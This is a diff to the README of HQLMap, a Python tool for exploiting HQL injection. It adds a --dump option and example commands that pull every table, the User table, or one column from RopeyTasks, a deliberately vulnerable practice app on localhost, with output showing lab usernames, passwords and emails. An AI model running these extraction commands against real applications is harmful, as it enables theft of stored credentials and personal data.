@@ -1,12 +1,12 @@
 HQLMap
 ========
 
-This project has been created to exploit Blind HQL Injections. 
+This project has been created to exploit HQL Injections. 
 The tool has been written in Python and is released under MIT License. 
 
 ### Where can you try the tool ? 
 
-If you have a fast environment where you can try the tool, I would recommend using RopeyTasks :
+If you want a fast vulnerable environment where you can try the tool, I would recommend using RopeyTasks :
 https://github.com/continuumsecurity/RopeyTasks/
 
 Moreover, if you want further information regarding HQLi, check this blog post : 
@@ -59,6 +59,7 @@ Options:
   --check               Check if host is vulnerable
   --user                Tries to get user() from dbms
   --count               Get count of specified table(s)
+  --dump                Dump specified table(s) / column(s)
   --results             Enumerate results after session
   --verbose             Verbose mode
 ```
@@ -212,6 +213,99 @@ And the output (after few secs) :
 ```
 
 To retrieve the user, I implemented an algorithm really similar to a "variable" dichotomy. 
+
+### Dumping database 
+
+#### All tables from database
+
+```
+python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=83C59DCB04A6DC954E4E1EEC2BB36EF6" --tables --columns --dump
+```
+
+And the output :
+
+```
+(redacted)
+[Task]
+  [Name]
+     - Bob&#39;s shopping
+     - Alice&#39;s shopping
+[Task]
+  [User_Id]
+     - 1
+     - 2
+[User]
+  [Id]
+     - 1
+     - 2
+     - 3
+[User]
+  [Username]
+     - bob
+     - alice
+     - admin
+(redacted)
+```
+
+#### Specific table from database
+
+```
+python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=83C59DCB04A6DC954E4E1EEC2BB36EF6" --T=User --columns --dump
+```
+
+And the output:
+
+```
+[User]
+  [Id]
+     - 1
+     - 2
+     - 3
+[User]
+  [Username]
+     - bob
+     - alice
+     - admin
+[User]
+  [Password]
+     - password
+     - password
+     - password
+[User]
+  [Email]
+     - bob@continuumsecurity.net
+     - alice@continuumsecurity.net
+     - admin@continuumsecurity.net
+[User]
+  [Firstname]
+     - Robert
+     - Alice
+     - Administrator
+[User]
+  [Lastname]
+     - McBride
+     - O&#39;Reilly
+     - Reynolds
+```
+
+#### Specific column from database
+
+
+```
+python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=83C59DCB04A6DC954E4E1EEC2BB36EF6" --T=User --C=username --dump
+```
+
+And the output :
+
+```
+[!] Table User has been found.
+[!] Column Username has been found in table User
+[User]
+  [username]
+     - bob
+     - alice
+     - admin
+```
 
 ### Conclusion (& License)
 Feel free to give feedbacks and ask for new features.  
